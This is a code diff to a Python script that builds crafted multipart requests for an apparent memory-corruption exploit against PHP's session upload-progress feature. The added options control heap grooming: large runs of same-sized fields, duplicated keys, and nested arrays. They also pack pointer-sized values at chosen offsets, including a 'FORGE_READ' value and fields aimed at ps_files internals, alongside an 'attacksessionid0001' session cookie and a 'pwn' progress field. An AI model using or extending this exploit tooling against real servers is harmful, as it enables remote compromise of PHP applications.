@@ -16,6 +16,20 @@ import sys
 
 N = int(sys.argv[1]) if len(sys.argv) > 1 else 900
 VL = int(sys.argv[2]) if len(sys.argv) > 2 else 231
+BUNIQ = int(os.environ.get('BUNIQ', '0'))
+DUP_IDX = int(os.environ.get('DUP_IDX', '-1'), 0)
+DUP_LEN = int(os.environ.get('DUP_LEN', '1'))
+BLATE = int(os.environ.get('BLATE', '0'))
+BTAILPAD = int(os.environ.get('BTAILPAD', '0'))
+BVAL_OFF = int(os.environ.get('BVAL_OFF', '0'), 0)
+BVAL_LEN = int(os.environ.get('BVAL_LEN', '0'), 0)
+NEST_N = int(os.environ.get('NEST_N', '0'))
+NEST_E = int(os.environ.get('NEST_E', '0'))
+NEST_VL = int(os.environ.get('NEST_VL', '1'))
+TAIL231_N = int(os.environ.get('TAIL231_N', '0'))
+TAIL232_N = int(os.environ.get('TAIL232_N', '0'))
+TAIL232_SAFE = int(os.environ.get('TAIL232_SAFE', '1'))
+NEST_FIRST = int(os.environ.get('NEST_FIRST', '0'))
 COOK_N = int(os.environ.get('BCOOK_N', '0'))
 COOK_LEN = int(os.environ.get('BCOOK_LEN', '200'))
 BQ_N = int(os.environ.get('BQ_N', '0'))
@@ -23,12 +37,56 @@ BQ_LEN = int(os.environ.get('BQ_LEN', '200'))
 BPAD_N = int(os.environ.get('BPAD_N', '0'))
 BPAD_LEN = int(os.environ.get('BPAD_LEN', '400'))
 BB_LEN = int(os.environ.get('BB_LEN', '0'))
+FORGE_LEN = int(os.environ.get('FORGE_LEN', '0'))
+FORGE_READ = int(os.environ.get('FORGE_READ', '0'), 0)
 assert N + 2 + (1 if BB_LEN else 0) <= 1000, "too many vars"
 
 BND = b'B' * 10
+def _mkval(i):
+    if BUNIQ:
+        v = bytearray(('v%04d' % i).encode().ljust(VL, b'x'))
+    else:
+        v = bytearray(b'V' * VL)
+    if BVAL_OFF > 0 and BVAL_OFF + 8 <= len(v):
+        import struct
+        struct.pack_into('<Q', v, BVAL_OFF, BVAL_LEN)
+    return bytes(v)
+
+def _nest_parts():
+    out = []
+    for _i in range(NEST_N):
+        for _j in range(NEST_E):
+            out.append(('a%d[%d]' % (_i, _j), b'n' * NEST_VL))
+    return out
+
 parts = []
+if NEST_FIRST:
+    parts.extend(_nest_parts())
 for i in range(N):
-    parts.append((str(1000 + i), b'V' * VL))
+    parts.append((str(1000 + i), _mkval(i)))
+if not NEST_FIRST:
+    parts.extend(_nest_parts())
+for _i in range(TAIL231_N):
+    parts.append(('t%d' % _i, b'T' * 231))
+for _i in range(TAIL232_N):
+    import struct
+    tb = bytearray(b'T' * 232)
+    if TAIL232_SAFE:
+        struct.pack_into('<Q', tb, 8, 0)   # ps_files.last_key
+        struct.pack_into('<Q', tb, 16, 0)  # ps_files.basedir
+    parts.append(('u%d' % _i, bytes(tb)))
+if BLATE:
+    parts.append(('PHPSESSID', b'attacksessionid0001'))
+    parts.append(('PHP_SESSION_UPLOAD_PROGRESS', b'pwn'))
+    if BTAILPAD:
+        parts.append(('999995', b'P' * BTAILPAD))
+if DUP_IDX >= 0:
+    parts.append((str(1000 + DUP_IDX), b'D' * DUP_LEN))
+if FORGE_LEN > 0:
+    import struct
+    fb = bytearray(b'F' * FORGE_LEN)
+    struct.pack_into('<Q', fb, 16, FORGE_READ)
+    parts.append(('999996', bytes(fb)))
 if BB_LEN > 0:
     if os.environ.get('BB_PAT', '0') == '1':
         import struct
@@ -55,8 +113,9 @@ if BF_P1 > 0:
     struct.pack_into('<Q', buf, D - 8, R)                     # len
     buf[D:] = b'M' * (L2 - D)
     parts.append(('900002', bytes(buf)))
-parts.append(('PHPSESSID', b'attacksessionid0001'))
-parts.append(('PHP_SESSION_UPLOAD_PROGRESS', b'pwn'))
+if not BLATE:
+    parts.append(('PHPSESSID', b'attacksessionid0001'))
+    parts.append(('PHP_SESSION_UPLOAD_PROGRESS', b'pwn'))
 
 o = bytearray()
 for name, data in parts:
